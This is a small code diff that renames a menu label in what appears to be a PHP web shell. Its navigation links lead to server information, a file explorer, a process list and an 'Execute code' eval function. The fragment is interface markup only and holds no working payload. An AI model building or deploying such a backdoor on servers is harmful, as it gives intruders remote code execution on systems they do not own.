@@ -2275,7 +2275,7 @@ if($s_auth){
 		<table style='width:100%;'>
 		<tr>
 		<td><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>' title='Home Current' onclick='return false;'><div class='menumi'>Home</div></a></td>
-		<td><a href='<?php echo $s_self; ?>x=info' title='Information about server' onclick='return false;'><div class='menumi'>Server Information</div></a></td>
+		<td><a href='<?php echo $s_self; ?>x=info' title='Information about server' onclick='return false;'><div class='menumi'>Server Info</div></a></td>
 		<td><a href='<?php echo $s_self; ?>' title='Explorer' onclick='return false;'><div class='menumi'>Explorer</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=ps' title='Display process status' onclick='return false;'><div class='menumi'>Process</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=eval' title='Execute code' onclick='return false;'><div class='menumi'>Execute</div></a></td>
